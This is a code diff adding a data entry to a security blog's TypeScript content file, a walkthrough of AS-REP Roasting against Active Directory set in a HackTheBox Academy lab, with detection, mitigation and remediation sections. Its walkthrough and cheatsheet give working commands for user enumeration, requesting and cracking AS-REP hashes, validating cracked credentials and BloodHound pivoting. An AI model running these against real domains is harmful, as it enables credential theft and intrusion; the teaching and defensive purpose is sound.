@@ -3,6 +3,9 @@
 import forensicsMemoryImg from '@/assets/forensics-memory.jpg';
 import forensicsLogsImg from '@/assets/forensics-logs.jpg';
 import forensicsNetworkImg from '@/assets/forensics-network.jpg';
+import adAsrepHero from '@/assets/ad-asrep-hero.jpg';
+import adAsrepFlow from '@/assets/ad-asrep-flow.jpg';
+import adAsrepCrack from '@/assets/ad-asrep-crack.jpg';
 
 export interface MitreTechnique {
   id: string;
@@ -572,6 +575,200 @@ export const forensicsBlogs: ForensicsBlog[] = [
       'Always feed PCAP into Zeek + RITA — beaconing is invisible to the human eye.',
       'JA3 fingerprints are gold for catching custom C2 frameworks.',
       'TLS inspection on egress is non-negotiable for high-value networks.',
+    ],
+  },
+];
+
+// =================== AD ATTACK ROOMS ===================
+
+export interface AdAttackImage {
+  src: string;
+  caption: string;
+}
+
+export interface AdAttackStep {
+  title: string;
+  description: string;
+  commands?: string[];
+  image?: AdAttackImage;
+  output?: string;
+}
+
+export interface AdAttackRoom {
+  id: string;
+  slug: string;
+  name: string;
+  shortName: string;
+  category: 'Credential Access' | 'Privilege Escalation' | 'Lateral Movement' | 'Persistence' | 'Defense Evasion';
+  severity: 'Low' | 'Medium' | 'High' | 'Critical';
+  difficulty: 'Easy' | 'Medium' | 'Hard' | 'Insane';
+  publishedAt: string;
+  author: string;
+  readingTime: number;
+  labProvider: 'HackTheBox' | 'TryHackMe';
+  labName: string;
+  labUrl: string;
+  coverImage: string;
+  summary: string;
+  prerequisites: string[];
+  attackFlow: string[];
+  walkthrough: AdAttackStep[];
+  commandsCheatsheet: { title: string; command: string; note?: string }[];
+  detection: string[];
+  mitigation: string[];
+  remediation: string[];
+  mitre: MitreTechnique[];
+  tools: string[];
+  references: { title: string; url: string }[];
+}
+
+export const adAttackRooms: AdAttackRoom[] = [
+  {
+    id: 'ad-asrep-roasting',
+    slug: 'ad-asrep-roasting',
+    name: 'AS-REP Roasting — Active Directory Credential Access',
+    shortName: 'AS-REP Roasting',
+    category: 'Credential Access',
+    severity: 'High',
+    difficulty: 'Medium',
+    publishedAt: '2025-05-01',
+    author: 'Ahmed Tareq',
+    readingTime: 12,
+    labProvider: 'HackTheBox',
+    labName: 'AS-REP Roasting — HTB Academy',
+    labUrl: 'https://academy.hackthebox.com/module/details/143',
+    coverImage: adAsrepHero,
+    summary:
+      'AS-REP Roasting abuses Active Directory accounts that have Kerberos pre-authentication disabled. The KDC will hand out an AS-REP message containing material encrypted with the user\'s NT hash to anyone who asks — letting an attacker crack the password offline with hashcat or john, with zero traffic to the target.',
+    prerequisites: [
+      'Network reachability to a domain controller on TCP/UDP 88 (Kerberos).',
+      'A list of valid AD usernames (no creds required).',
+      'Impacket installed (GetNPUsers.py) or Rubeus on a compromised Windows host.',
+      'A wordlist (rockyou.txt) and hashcat / john for offline cracking.',
+    ],
+    attackFlow: [
+      'Enumerate AD users (LDAP, RPC, kerbrute, or a captured user list).',
+      'Send AS-REQ packets without pre-authentication for each user.',
+      'KDC returns an AS-REP for any account flagged DONT_REQ_PREAUTH (UAC bit 0x400000).',
+      'Extract the encrypted timestamp blob — format $krb5asrep$23$user@DOMAIN:hash.',
+      'Crack offline with hashcat -m 18200 to recover the cleartext password.',
+      'Authenticate as the user and pivot deeper into the domain.',
+    ],
+    walkthrough: [
+      {
+        title: 'Step 1 — Enumerate domain users',
+        description:
+          'Before AS-REP Roasting, we need a list of valid usernames. In the HTB room we already have low-priv credentials, so we use Impacket\'s GetADUsers.py to pull every account from the directory.',
+        commands: [
+          'GetADUsers.py -all -dc-ip 10.10.10.161 INLANEFREIGHT.LOCAL/htb-student:Academy_student_AD\\!',
+        ],
+        output:
+          'sAMAccountName  Email  PasswordLastSet  LastLogon\nadministrator   -      2022-09-29 ...  2024-01-12\nhtb-student     -      2022-09-29 ...  2024-01-12\nbsmith          -      2022-09-29 ...  never logged on\n... (truncated)',
+      },
+      {
+        title: 'Step 2 — Understand the Kerberos pre-auth check',
+        description:
+          'A normal AS-REQ ships an encrypted timestamp (PA-ENC-TIMESTAMP) proving the client knows the password. If the account has "Do not require Kerberos preauthentication" set, the KDC skips that check and replies with an AS-REP whose encrypted portion is derived from the user\'s NT hash — a perfect offline cracking target.',
+        image: { src: adAsrepFlow, caption: 'Kerberos AS-REQ vs AS-REP — pre-auth disabled = roastable.' },
+      },
+      {
+        title: 'Step 3 — Roast all accounts at once (Linux / Impacket)',
+        description:
+          'GetNPUsers.py with -request asks the KDC for AS-REPs for every account that allows it. With a username list we can do this fully unauthenticated.',
+        commands: [
+          'GetNPUsers.py -no-pass -usersfile valid_users.txt -dc-ip 10.10.10.161 INLANEFREIGHT.LOCAL/',
+          'GetNPUsers.py -request -outputfile asrep_hashes.txt -dc-ip 10.10.10.161 INLANEFREIGHT.LOCAL/htb-student:Academy_student_AD\\!',
+        ],
+        output:
+          '[*] Getting TGT for mmorgan\n$krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:b24f...$3a78f...c2\n[-] User bsmith doesn\'t have UF_DONT_REQUIRE_PREAUTH set',
+      },
+      {
+        title: 'Step 4 — Roast from a Windows foothold (Rubeus)',
+        description:
+          'When we already control a domain-joined host, Rubeus does the same thing natively over Kerberos with no Impacket dependency.',
+        commands: [
+          'Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt',
+          'Rubeus.exe asreproast /user:mmorgan /format:hashcat',
+        ],
+      },
+      {
+        title: 'Step 5 — Crack the AS-REP hash offline',
+        description:
+          'Mode 18200 in hashcat targets the etype 23 (RC4-HMAC) AS-REP blob. With rockyou.txt the weak passwords fall in seconds.',
+        commands: [
+          'hashcat -m 18200 asrep_hashes.txt /usr/share/wordlists/rockyou.txt --force',
+          'john --wordlist=/usr/share/wordlists/rockyou.txt asrep_hashes.txt',
+        ],
+        image: { src: adAsrepCrack, caption: 'hashcat -m 18200 cracking $krb5asrep$23$ blob with rockyou.' },
+        output:
+          '$krb5asrep$23$mmorgan@INLANEFREIGHT.LOCAL:b24f…$3a78f…c2:Welcome1',
+      },
+      {
+        title: 'Step 6 — Validate the recovered credential',
+        description:
+          'Confirm the cracked password actually authenticates and check what the user can reach. CrackMapExec or netexec is perfect for this sweep.',
+        commands: [
+          'nxc smb 10.10.10.161 -u mmorgan -p Welcome1',
+          'nxc ldap 10.10.10.161 -u mmorgan -p Welcome1 --groups',
+        ],
+      },
+      {
+        title: 'Step 7 — Pivot: BloodHound from the new identity',
+        description:
+          'Feed the new credentials to BloodHound to find a path from mmorgan → Domain Admins. AS-REP cracks frequently land on service or stale accounts with hidden privileges.',
+        commands: [
+          'bloodhound-python -u mmorgan -p Welcome1 -d INLANEFREIGHT.LOCAL -ns 10.10.10.161 -c All',
+        ],
+      },
+    ],
+    commandsCheatsheet: [
+      { title: 'List users with PreAuth disabled (LDAP filter)', command: '(&(samAccountType=805306368)(userAccountControl:1.2.840.113556.1.4.803:=4194304))' },
+      { title: 'PowerView — find roastable users', command: 'Get-DomainUser -PreauthNotRequired | select samaccountname,distinguishedname' },
+      { title: 'Impacket — unauth roast with userlist', command: 'GetNPUsers.py -no-pass -usersfile users.txt -dc-ip <DC_IP> DOMAIN/' },
+      { title: 'Impacket — authed roast (auto-discover)', command: 'GetNPUsers.py -request -dc-ip <DC_IP> DOMAIN/user:pass' },
+      { title: 'Rubeus — asreproast Hashcat format', command: 'Rubeus.exe asreproast /format:hashcat /outfile:asrep.txt' },
+      { title: 'Hashcat — crack AS-REP (etype 23)', command: 'hashcat -m 18200 asrep.txt rockyou.txt --force' },
+      { title: 'John the Ripper', command: 'john --format=krb5asrep --wordlist=rockyou.txt asrep.txt' },
+      { title: 'Validate creds with NetExec', command: 'nxc smb <DC_IP> -u <user> -p <pass>' },
+      { title: 'Disable PreAuth (attacker test, do not run in prod)', command: 'Set-ADAccountControl -Identity <user> -DoesNotRequirePreAuth $true' },
+      { title: 'Re-enable PreAuth (remediation)', command: 'Set-ADAccountControl -Identity <user> -DoesNotRequirePreAuth $false' },
+    ],
+    detection: [
+      'Windows Event ID 4768 — TGT request with PreAuthType = 0 (no pre-auth) and Ticket Encryption Type 0x17 (RC4) is the canonical indicator.',
+      'Spike in 4768 events from a single source IP across many accounts in a short window.',
+      'Honey accounts: create a decoy user with PreAuth disabled and alert on ANY 4768 for it.',
+      'Sysmon Event ID 3 (network connect) from non-admin hosts to TCP/88 outside business hours.',
+      'EDR detection of Rubeus.exe / GetNPUsers.py command-line patterns.',
+    ],
+    mitigation: [
+      'Audit Active Directory weekly: list every account with DONT_REQ_PREAUTH (UAC 0x400000) and re-enable pre-auth.',
+      'Enforce strong password policy (>= 14 chars, complexity, banned-words list) for any account that legitimately must keep PreAuth disabled.',
+      'Disable RC4 (etype 23) Kerberos encryption — force AES-128/256 only via GPO "Network security: Configure encryption types allowed for Kerberos".',
+      'Privileged accounts go in the Protected Users group — automatically blocks RC4 and disables NTLM/Digest.',
+      'Tier-0 administrative model: domain admins never used for daily logon; isolate from workstations.',
+      'Continuous attack-surface monitoring with PingCastle / Purple Knight for the DONT_REQ_PREAUTH finding.',
+    ],
+    remediation: [
+      'Identify all roastable accounts: Get-ADUser -Filter \'UserAccountControl -band 4194304\'.',
+      'Re-enable PreAuth on each: Set-ADAccountControl -Identity <user> -DoesNotRequirePreAuth $false.',
+      'Force a password reset on every account whose hash may have been captured.',
+      'Reset krbtgt twice (10-hour gap) if AS-REPs may have been used to mint TGTs offline.',
+      'Rotate any service-account passwords matching the cracked one (password reuse hunt).',
+      'Push GPO disabling RC4 etypes domain-wide and validate with klist on a test host.',
+      'Add the source IP to the firewall blocklist and pull 90 days of 4768 logs for hunt.',
+      'File an Azure AD / Entra Conditional Access policy requiring MFA for any sync-back of the affected identity.',
+    ],
+    mitre: [
+      { id: 'T1558.004', name: 'AS-REP Roasting', url: 'https://attack.mitre.org/techniques/T1558/004/' },
+      { id: 'T1110.002', name: 'Password Cracking', url: 'https://attack.mitre.org/techniques/T1110/002/' },
+      { id: 'T1078.002', name: 'Valid Accounts — Domain Accounts', url: 'https://attack.mitre.org/techniques/T1078/002/' },
+    ],
+    tools: ['Impacket (GetNPUsers.py)', 'Rubeus', 'PowerView', 'hashcat', 'John the Ripper', 'NetExec / CrackMapExec', 'BloodHound'],
+    references: [
+      { title: 'HTB Academy — Active Directory Enumeration & Attacks', url: 'https://academy.hackthebox.com/module/details/143' },
+      { title: 'MITRE ATT&CK T1558.004', url: 'https://attack.mitre.org/techniques/T1558/004/' },
+      { title: 'Microsoft — Kerberos Pre-Authentication', url: 'https://learn.microsoft.com/en-us/windows-server/security/kerberos/preventing-open-network-sharing' },
+      { title: 'Hashcat mode 18200 reference', url: 'https://hashcat.net/wiki/doku.php?id=example_hashes' },
     ],
   },
 ];
